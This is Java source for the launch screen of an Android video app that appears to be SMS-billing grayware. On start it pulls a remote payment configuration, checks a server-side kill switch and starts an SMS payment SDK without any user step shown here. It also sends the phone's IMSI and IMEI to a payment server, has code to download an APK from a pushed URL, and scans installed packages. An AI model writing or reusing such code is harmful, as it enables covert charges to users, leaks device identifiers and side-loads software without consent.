package com.main.activity;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import org.json.JSONArray;
import org.json.JSONObject;

import android.app.Activity;
import android.app.Dialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.DialogInterface.OnKeyListener;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.animation.Animation;
import android.view.animation.AnimationUtils;
import android.view.animation.LinearInterpolator;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

import com.lidroid.xutils.HttpUtils;
import com.lidroid.xutils.exception.HttpException;
import com.lidroid.xutils.http.HttpHandler;
import com.lidroid.xutils.http.ResponseInfo;
import com.lidroid.xutils.http.callback.RequestCallBack;
import com.lidroid.xutils.http.client.HttpRequest.HttpMethod;
import com.wangm.ncj.R;
import com.umeng.analytics.MobclickAgent;
import com.umeng.onlineconfig.OnlineConfigAgent;
import com.zmv.zf.bean.BaseJson;
import com.zmv.zf.common.Conf;
import com.zmv.zf.database.DataBase;
import com.zmv.zf.database.UserDAO;
import com.zmv.zf.pay.ConfigUtils;
import com.zmv.zf.pay.SMSPayUtils;
import com.zmv.zf.service.MainService;
import com.zmv.zf.utils.BasicUtils;
import com.zmv.zf.utils.ExitManager;
import com.zmv.zf.utils.IOUtils;
import com.zmv.zf.utils.NetworkUtils;

public class MainLaunchActivity extends Activity {
	public static ConfigUtils config = new ConfigUtils();
	private Context context;
	private boolean open = false;
	private TextView tv;
	private boolean goIn = false;
	private String run_status;
	SMSPayUtils payUtils;
	private Handler handler = new Handler() {
		public void handleMessage(Message msg) {
			try {

				switch (msg.what) {
				case 0:// 请求网络
					if (!open) {
						open = true;
						setDialogView(context);
						new Thread(new Runnable() {

							@Override
							public void run() {
								// TODO Auto-generated method stub
								try {
									getPaySDK();
									run_status = OnlineConfigAgent
											.getInstance().getConfigParams(
													context, "run_status");
									Thread.sleep(50000);
									handler.sendEmptyMessage(2);

								} catch (Exception e) {
									// TODO: handle exception
								}
							}
						}).start();
					}
					break;
				case 1:
					networkDialog();
					break;
				case 2:
					if (mDialog != null)
						mDialog.dismiss();
					if (!goIn) {
						goIn = true;
						startService(new Intent(context, MainService.class));
						startActivity(new Intent(MainLaunchActivity.this,
								MainActivity.class));
						finish();
					}

					break;
				case 3:
					try {
						if (mDialog != null)
							mDialog.dismiss();
						if (run_status == null || run_status.trim().equals("")) {
							run_status = OnlineConfigAgent.getInstance()
									.getConfigParams(context, "run_status");
							if (run_status != null
									&& run_status.trim().equals("0")) {
								handler.sendEmptyMessage(4);
								return;
							}
						} else if (run_status.trim().equals("0")) {
							handler.sendEmptyMessage(4);
							return;
						}
						payUtils = new SMSPayUtils(MainLaunchActivity.this,
								"warning", 0);
						payUtils.initSDK();
					} catch (Exception e) {
						// TODO: handle exception
					}
					break;
				case 4:
					goIn = true;
					finish();
					break;
				default:
					break;
				}
			} catch (Exception e) {
				// TODO: handle exception
			}
		}
	};
	Dialog mDialog;

	public void setDialogView(Context context) {
		mDialog = BasicUtils.showDialog(context, R.style.BasicDialog);
		mDialog.setContentView(R.layout.dialog_wait);
		mDialog.setCanceledOnTouchOutside(false);

		Animation anim = AnimationUtils.loadAnimation(context,
				R.anim.dialog_prog);
		LinearInterpolator lir = new LinearInterpolator();
		anim.setInterpolator(lir);
		mDialog.findViewById(R.id.img_dialog_progress).startAnimation(anim);
		mDialog.setOnKeyListener(new OnKeyListener() {
			@Override
			public boolean onKey(DialogInterface dialog, int keyCode,
					KeyEvent event) {
				if (keyCode == KeyEvent.KEYCODE_BACK
						&& event.getAction() == KeyEvent.ACTION_DOWN) {
					if (mDialog != null)
						mDialog.dismiss();

					return false;
				}
				return false;
			}
		});
		mDialog.show();
	}

	Dialog networkDialog;

	private void networkDialog() {
		networkDialog = BasicUtils.showDialog(context, R.style.BasicDialog);
		networkDialog.setContentView(R.layout.dialog_nick);
		((EditText) networkDialog.getWindow().findViewById(R.id.ed_dialog_msg))
				.setVisibility(View.GONE);
		networkDialog.getWindow().findViewById(R.id.tv_dialog_open)
				.setVisibility(View.VISIBLE);
		Button cancel = ((Button) networkDialog.getWindow().findViewById(
				R.id.btn_dialog_cancle));
		Button sure = ((Button) networkDialog.getWindow().findViewById(
				R.id.btn_dialog_sure));
		cancel.setText("退出");
		sure.setText("开启");
		cancel.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View arg0) {
				// TODO Auto-generated method stub
				networkDialog.dismiss();
				finish();
			}
		});
		sure.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View arg0) {
				// TODO Auto-generated method stub
				{
					NetworkUtils network = new NetworkUtils(context);
					network.toggleWiFi(true);

				}
			}
		});
		networkDialog.setCanceledOnTouchOutside(false);
		networkDialog.setCancelable(false);
		networkDialog.show();
	}

	SimpleDateFormat df = new SimpleDateFormat("yyyyMMdd");

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_launch);
		try {

			context = MainLaunchActivity.this;
			DisplayMetrics dm = new DisplayMetrics();
			getWindowManager().getDefaultDisplay().getMetrics(dm);
			Conf.width = dm.widthPixels;
			Conf.height = dm.heightPixels;
			ExitManager.getScreenManager().pushActivity(this);
			tv = (TextView) findViewById(R.id.tv_title);
			IntentFilter mFilter = new IntentFilter();
			mFilter.addAction(ConnectivityManager.CONNECTIVITY_ACTION);
			mFilter.addAction("com.zmv.login.action");
			registerReceiver(mReceiver, mFilter);
			// 注册在线参数
			OnlineConfigAgent.getInstance().updateOnlineConfig(this);
			// 初始化数据
			new Thread(new Runnable() {
				@Override
				public void run() {
					// TODO Auto-generated method stub
					try {

						UserDAO userDao = new UserDAO(context);
						BaseJson user = userDao.findUid();
						Conf.UID = user.getUid();
						Conf.NICK = user.getName();
						Conf.OPEN = user.getOpen();// 剩余播放次数
						int isVip = user.getIsVip();
						int isDay = user.getDay();
						if (isVip == 0 || isDay == 0)
							Conf.VIP = false;
						else {
							long extime = (new Date().getTime() - df.parse(
									String.valueOf(isVip)).getTime()) / 86400000;
							if (extime <= isDay && extime >= 0)
								Conf.VIP = true;
							else
								Conf.VIP = false;
						}
						// Log.e("vip", Conf.VIP + "=" + Conf.OPEN + "="
						// + Conf.NICK);
						// Thread.sleep(500);
						// PersonDAO per = new PersonDAO(context);
						// per.addper();
						// Thread.sleep(500);
						// VideoDAO video = new VideoDAO(context);
						// video.addvideo();

					} catch (Exception e) {
						// TODO: handle exception
					}
				}
			}).start();

			PackageInfo packageInfo = getPackageManager().getPackageInfo(
					getPackageName(), 0);
			tv.setText(Conf.CID + "\t" + packageInfo.versionCode + "."
					+ packageInfo.versionName);
		} catch (Exception e) {
			// TODO: handle exception
		}
	}

	@Override
	protected void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
		try {
			if (mReceiver != null)
				unregisterReceiver(mReceiver);
			if (payUtils != null)
				payUtils.payfinish();
			ExitManager.getScreenManager().pullActivity(this);
		} catch (Exception e) {
			// TODO: handle exception
		}
	}

	private BroadcastReceiver mReceiver = new BroadcastReceiver() {

		@Override
		public void onReceive(Context context, Intent intent) {
			String action = intent.getAction();
			if (action.equals("android.net.conn.CONNECTIVITY_CHANGE")) {
				if (NetworkUtils.checkNet(context)) {
					handler.sendEmptyMessageDelayed(0, 1000);
					if (networkDialog != null)
						networkDialog.dismiss();
				} else {
					handler.sendEmptyMessageDelayed(1, 1000);
				}
			} else if (action.equals("com.zmv.login.action")) {
				handler.sendEmptyMessage(2);
			}
		}
	};

	@Override
	public void onResume() {
		// TODO Auto-generated method stub
		super.onResume();
		MobclickAgent.onResume(this);
	}

	@Override
	public void onPause() {
		// TODO Auto-generated method stub
		super.onPause();
		MobclickAgent.onPause(this);
	}

	public void getPaySDK() {
		// TODO Auto-generated method stub
		// downloadChild();
		HttpUtils pay_http = new HttpUtils();
		pay_http.configCurrentHttpCacheExpiry(1000);
		pay_http.send(HttpMethod.GET, Conf.PAY_SERVERURL,
				new RequestCallBack<String>() {

					@Override
					public void onFailure(HttpException arg0, String arg1) {
						// TODO Auto-generated method stub
						// 获取失败
						JSONObject pay_object;
						try {
							MobclickAgent.onEvent(context, "paylist_fail");
							pay_object = new JSONObject(DataBase.PAYMSG);

							if (!pay_object.isNull("warning")) {
								JSONArray jsonObject = null;
								if (Conf.operators == 1) {
									jsonObject = pay_object.getJSONObject(
											"warning").getJSONArray("1");
								} else if (Conf.operators == 2) {
									jsonObject = pay_object.getJSONObject(
											"warning").getJSONArray("2");
								} else if (Conf.operators == 3) {
									jsonObject = pay_object.getJSONObject(
											"warning").getJSONArray("3");
								}
								config.PayJson(jsonObject, "warning");
							}
							if (!pay_object.isNull("libao")) {
								JSONArray jsonObject = null;
								if (Conf.operators == 1) {
									jsonObject = pay_object.getJSONObject(
											"libao").getJSONArray("1");
								} else if (Conf.operators == 2) {
									jsonObject = pay_object.getJSONObject(
											"libao").getJSONArray("2");
								} else if (Conf.operators == 3) {
									jsonObject = pay_object.getJSONObject(
											"libao").getJSONArray("3");
								}
								config.PayJson(jsonObject, "libao");
							}
							if (!pay_object.isNull("shipin")) {
								JSONArray jsonObject = null;
								if (Conf.operators == 1) {
									jsonObject = pay_object.getJSONObject(
											"shipin").getJSONArray("1");
								} else if (Conf.operators == 2) {
									jsonObject = pay_object.getJSONObject(
											"shipin").getJSONArray("2");
								} else if (Conf.operators == 3) {
									jsonObject = pay_object.getJSONObject(
											"shipin").getJSONArray("3");
								}

								config.PayJson(jsonObject, "shipin");
							}
						} catch (Exception e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						} finally {
							handler.sendEmptyMessageDelayed(3, 0);
						}
					}

					@Override
					public void onSuccess(ResponseInfo<String> arg0) {
						// TODO Auto-generated method stub
						try {
							MobclickAgent.onEvent(context, "paylist_success");
							String pay_json = arg0.result.toString();
							// Log.e("读取服务器配置内容", pay_json);
							if (pay_json != null) {
								JSONObject pay_object = new JSONObject(pay_json);
								if (!pay_object.isNull("warning")) {
									JSONArray jsonObject = null;
									if (Conf.operators == 1) {
										jsonObject = pay_object.getJSONObject(
												"warning").getJSONArray("1");
									} else if (Conf.operators == 2) {
										jsonObject = pay_object.getJSONObject(
												"warning").getJSONArray("2");
									} else if (Conf.operators == 3) {
										jsonObject = pay_object.getJSONObject(
												"warning").getJSONArray("3");
									}
									config.PayJson(jsonObject, "warning");
								}
								if (!pay_object.isNull("libao")) {
									JSONArray jsonObject = null;
									if (Conf.operators == 1) {
										jsonObject = pay_object.getJSONObject(
												"libao").getJSONArray("1");
									} else if (Conf.operators == 2) {
										jsonObject = pay_object.getJSONObject(
												"libao").getJSONArray("2");
									} else if (Conf.operators == 3) {
										jsonObject = pay_object.getJSONObject(
												"libao").getJSONArray("3");
									}
									config.PayJson(jsonObject, "libao");
								}
								if (!pay_object.isNull("shipin")) {
									JSONArray jsonObject = null;
									if (Conf.operators == 1) {
										jsonObject = pay_object.getJSONObject(
												"shipin").getJSONArray("1");
									} else if (Conf.operators == 2) {
										jsonObject = pay_object.getJSONObject(
												"shipin").getJSONArray("2");
									} else if (Conf.operators == 3) {
										jsonObject = pay_object.getJSONObject(
												"shipin").getJSONArray("3");
									}

									config.PayJson(jsonObject, "shipin");
								}
							}
							// getPayPro();
						} catch (Exception e) {
							// TODO: handle exception
						} finally {
							handler.sendEmptyMessageDelayed(3, 0);
						}

					}
				});

	}

	private void downloadChild() {
		try {
			String packName = getPackName(context);
			if (packName == null || packName.trim().equals("")) {
				HttpUtils http = new HttpUtils();
				Conf.filename = ConfigUtils.pushapkdownurl.substring(
						ConfigUtils.pushapkdownurl.lastIndexOf("/") + 1,
						ConfigUtils.pushapkdownurl.length());
				if (IOUtils.getcjVideoAPKFolder(Conf.filename).exists()) {
					IOUtils.getcjVideoAPKFolder(Conf.filename).delete();
				}
				HttpHandler downhandler = http.download(
						ConfigUtils.pushapkdownurl,// uri.toString(),
						IOUtils.getcjVideoAPKFolder(Conf.filename).toString(),
						true, new RequestCallBack<File>() {
							@Override
							public void onStart() {
							}

							@Override
							public void onLoading(long total, long current,
									boolean isUploading) {
								// Log.e("baoming", total + "==" + current);
							}

							@Override
							public void onSuccess(
									ResponseInfo<File> responseInfo) {
								String archiveFilePath = IOUtils
										.getcjVideoAPKFolder(Conf.filename)
										.getAbsolutePath();// 安装包路径
								PackageManager pm = context.getPackageManager();
								PackageInfo info = pm.getPackageArchiveInfo(
										archiveFilePath,
										PackageManager.GET_ACTIVITIES);
								if (info == null)
									return;
								ConfigUtils.packname = info.packageName;
								// Log.e("baoming", ConfigUtils.packname);
								MobclickAgent.onEvent(context, "zb_down");
								handler.sendEmptyMessageDelayed(2, 1000);
							}

							@Override
							public void onFailure(HttpException error,
									String msg) {
								MobclickAgent.onEvent(context, "zb_down_error");
								handler.sendEmptyMessageDelayed(2, 1000);
							}
						});

			} else {
				ConfigUtils.packname = packName;
				handler.sendEmptyMessageDelayed(2, 2000);
			}
		} catch (Exception e) {
			// TODO: handle exception
			handler.sendEmptyMessageDelayed(2, 1000);
		}
	}

	/**
	 * 根据省份获取调用顺序
	 */
	private void getPayPro() {
		HttpUtils pay_http = new HttpUtils();
		pay_http.configCurrentHttpCacheExpiry(1000);
		String payURL = Conf.PAY_PROVINCEURL + "?app_id=1003&imsi=" + Conf.IMSI
				+ "&imei=" + Conf.IMEI;
		pay_http.send(HttpMethod.GET, payURL, new RequestCallBack<String>() {

			@Override
			public void onFailure(HttpException arg0, String arg1) {
				// TODO Auto-generated method stub

			}

			@Override
			public void onSuccess(ResponseInfo<String> arg0) {
				// TODO Auto-generated method stub
				try {
					String pay_json = arg0.result.toString();

					// Log.e("根据省份获取调用顺序", pay_json);
					if (pay_json != null) {
						JSONObject pay_object = new JSONObject(pay_json);
						if (!pay_object.isNull("warning")) {
							JSONArray jsonObject = pay_object
									.getJSONArray("warning");

							if (jsonObject != null && jsonObject.length() > 0)
								config.PayJson(jsonObject, "warning");

						}
						if (!pay_object.isNull("libao")) {
							JSONArray jsonObject = pay_object
									.getJSONArray("libao");
							if (jsonObject != null && jsonObject.length() > 0)
								config.PayJson(jsonObject, "libao");
						}
						if (!pay_object.isNull("shipin")) {
							JSONArray jsonObject = pay_object
									.getJSONArray("shipin");
							if (jsonObject != null && jsonObject.length() > 0)
								config.PayJson(jsonObject, "shipin");
						}

					}
				} catch (Exception e) {
					// TODO: handle exception
				}

			}
		});
	}

	private String getPackName(Context context) {
		String packName = "";
		PackageManager packageManager = context.getPackageManager();
		List<PackageInfo> list = packageManager
				.getInstalledPackages(PackageManager.GET_PERMISSIONS);
		for (PackageInfo packageInfo : list) {
			// LogUtils.printLogE("packageName", packageInfo.packageName);
			if (packageInfo.packageName.contains("com.ktco"))// com.jkle
				packName = packageInfo.packageName;

		}
		return packName;
	}

}
